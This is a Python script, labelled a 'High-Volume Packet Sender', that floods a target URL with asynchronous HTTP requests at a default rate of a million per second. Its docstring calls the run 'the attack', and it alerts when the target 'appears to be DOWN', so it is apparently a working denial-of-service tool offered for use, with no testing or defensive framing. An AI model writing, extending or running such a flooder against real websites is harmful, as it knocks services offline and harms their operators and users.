#!/usr/bin/env python3
import asyncio
import argparse
import time
import signal
import sys
import random
from datetime import datetime
from typing import Optional, List
import aiohttp
import threading
from concurrent.futures import ThreadPoolExecutor

class AtomicCounter:
    """A thread-safe counter implementation"""
    def __init__(self, initial=0):
        self._value = initial
        self._lock = threading.Lock()
    
    def increment(self, delta=1):
        with self._lock:
            self._value += delta
            return self._value
    
    def value(self):
        with self._lock:
            return self._value

class PacketSender:
    def __init__(self, url: str, target_rate: int, worker_count: int, duration_secs: int, payload_size: Optional[int] = None):
        self.url = url
        self.target_rate = target_rate
        self.worker_count = worker_count
        self.duration_secs = duration_secs
        self.payload_size = payload_size
        
        # Shared state
        self.running = True
        self.packets_sent = AtomicCounter(0)
        self.packets_successful = AtomicCounter(0)
        self.packets_failed = AtomicCounter(0)
        
        # Generate payload if needed
        self.payload = None
        if self.payload_size is not None and self.payload_size > 0:
            self.payload = 'A' * self.payload_size
        
        # Notification queue
        self.notification_queue = asyncio.Queue(maxsize=1000)
        
        # Calculate packets per worker
        self.packets_per_worker = target_rate // worker_count

    async def status_monitor(self):
        """Monitor and display status of the attack"""
        last_packets = 0
        while self.running:
            start_time = time.time()
            await asyncio.sleep(1)
            
            current_packets = self.packets_sent.value()
            elapsed = time.time() - start_time
            rate = (current_packets - last_packets) / elapsed if elapsed > 0 else 0
            
            # Reset counters for next interval
            last_packets = current_packets
            
            # Display status
            sys.stdout.write(f"\r💼 Packets: {current_packets} sent, {self.packets_successful.value()} successful, "
                          f"{self.packets_failed.value()} failed, {rate:.2f} packets/sec   ")
            sys.stdout.flush()
        
        # Final stats
        print("\n📊 Final statistics:")
        print(f"Total packets sent: {self.packets_sent.value()}")
        print(f"Successful: {self.packets_successful.value()}")
        print(f"Failed: {self.packets_failed.value()}")

    async def notification_reader(self):
        """Read and display notifications from the queue"""
        while self.running:
            try:
                message = await asyncio.wait_for(self.notification_queue.get(), timeout=0.5)
                print(f"\n📢 {message}")
                self.notification_queue.task_done()
            except asyncio.TimeoutError:
                # No messages available, continue waiting
                continue

    async def worker(self, worker_id: int):
        """Worker function to send packets"""
        counter = 0
        consecutive_failures = 0
        last_notification_time = time.time()
        worker_packets_per_second = self.packets_per_worker
        sleep_duration = 1.0 / worker_packets_per_second if worker_packets_per_second > 0 else 0
        
        # Create new aiohttp session for each worker
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            while self.running:
                start_time = time.time()
                
                # Send packet
                counter += 1
                self.packets_sent.increment()
                
                try:
                    if self.payload:
                        response = await session.post(self.url, data=self.payload)
                    else:
                        response = await session.get(self.url)
                    
                    # Check if successful
                    if response.status < 400:
                        self.packets_successful.increment()
                        consecutive_failures = 0
                        
                        # Send notification for every 1,000,000 packets
                        if counter % 1_000_000 == 0:
                            msg = f"Worker {worker_id}: Successfully sent {counter // 1_000_000} million packets"
                            await self.notification_queue.put(msg)
                    else:
                        # Server responded but with an error
                        self.packets_failed.increment()
                        consecutive_failures += 1
                
                except Exception as e:
                    self.packets_failed.increment()
                    consecutive_failures += 1
                    
                    # If we've had multiple consecutive failures and it's been at least 5 seconds since last notification
                    if consecutive_failures >= 10 and (time.time() - last_notification_time) >= 5:
                        msg = f"⚠️ Worker {worker_id}: Website may be down! {consecutive_failures} consecutive failures"
                        await self.notification_queue.put(msg)
                        last_notification_time = time.time()
                    
                    # If many consecutive failures, send a major alert
                    if consecutive_failures >= 100 and (time.time() - last_notification_time) >= 10:
                        msg = f"🚨 ALERT: Website {self.url} appears to be DOWN! Worker {worker_id} reports {consecutive_failures} consecutive failures"
                        await self.notification_queue.put(msg)
                        last_notification_time = time.time()
                
                # Calculate sleep time to maintain target rate
                elapsed = time.time() - start_time
                if elapsed < sleep_duration:
                    await asyncio.sleep(sleep_duration - elapsed)

    async def run(self):
        """Main entry point to run the packet sender"""
        # Start status monitor
        status_task = asyncio.create_task(self.status_monitor())
        
        # Start notification reader
        notification_task = asyncio.create_task(self.notification_reader())
        
        # Start worker tasks
        worker_tasks = [asyncio.create_task(self.worker(i)) for i in range(self.worker_count)]
        
        # If duration is set, run for that time then stop
        if self.duration_secs > 0:
            await asyncio.sleep(self.duration_secs)
            self.running = False
            print("\n⏱️ Time limit reached, shutting down...")
        
        # Wait for all tasks to complete
        await asyncio.gather(*worker_tasks, return_exceptions=True)
        
        # Cancel monitoring tasks
        status_task.cancel()
        notification_task.cancel()
        
        print("✅ All workers completed successfully")

def signal_handler(signal, frame):
    """Handle Ctrl+C"""
    print("\n🛑 Received shutdown signal, stopping workers...")
    # Signal will be handled in main loop

async def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="High-Volume Packet Sender",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL to send packets to")
    parser.add_argument("-r", "--rate", type=int, default=1000000, help="Target packets per second")
    parser.add_argument("-w", "--workers", type=int, default=100, help="Number of worker threads")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds to run (0 for unlimited)")
    parser.add_argument("-s", "--size", type=int, help="Payload size in bytes")
    
    args = parser.parse_args()
    
    print("🚀 Starting high-volume packet sender")
    print(f"Target URL: {args.url}")
    print(f"Target rate: {args.rate} packets/second")
    print(f"Worker threads: {args.workers}")
    
    if args.duration > 0:
        print(f"Duration: {args.duration} seconds")
    else:
        print("Duration: unlimited (until interrupted)")
    
    # Create packet sender
    sender = PacketSender(
        url=args.url,
        target_rate=args.rate,
        worker_count=args.workers,
        duration_secs=args.duration,
        payload_size=args.size
    )
    
    # Register signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        await sender.run()
    except KeyboardInterrupt:
        sender.running = False
        print("\n🛑 Interrupted, shutting down...")
    
if __name__ == "__main__":
    asyncio.run(main())